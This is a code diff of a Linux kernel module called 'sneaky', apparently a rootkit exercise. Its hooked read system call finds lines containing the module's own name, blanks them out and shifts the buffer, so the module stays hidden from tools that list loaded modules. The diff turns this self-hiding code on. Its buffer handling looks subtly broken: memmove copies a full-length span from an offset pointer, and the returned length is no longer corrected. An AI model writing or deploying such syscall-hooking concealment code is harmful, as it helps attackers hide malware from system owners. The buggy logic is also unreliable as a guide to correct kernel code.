@@ -76,21 +76,23 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 asmlinkage int sneaky_read(int fd, char *buf, size_t count)
 {
   unsigned int ret;
-//  char *tmp;
+  char *tmp;
   ret = original_read(fd, buf, count);
   if(strnstr(buf, MODULE_NAME, strlen(MODULE_NAME))){
     printk(KERN_INFO "SNEAKY MOD DETECTED!%s\n", buf);
-/* BROKEN!!!
     tmp = buf;
-    while(*tmp && *tmp != '\n' && *tmp != ' '){
+    while(*tmp && *tmp != '\n'){
 	*tmp = ' ';
 	tmp++;
     }
-    memcpy(tmp, buf, (buf + ret) - tmp);
-    ret = ret - (tmp - buf);
+    //memcpy(tmp, buf, (buf + ret) - tmp);
+    memmove(buf, (char *) tmp, ret);
+   // ret = ret - (tmp - buf);
     printk(KERN_INFO "SNEAKY MOD DETECTED!%s\n", buf);
     return ret;
-*/
+
+
+	
   }
   return ret;
 }
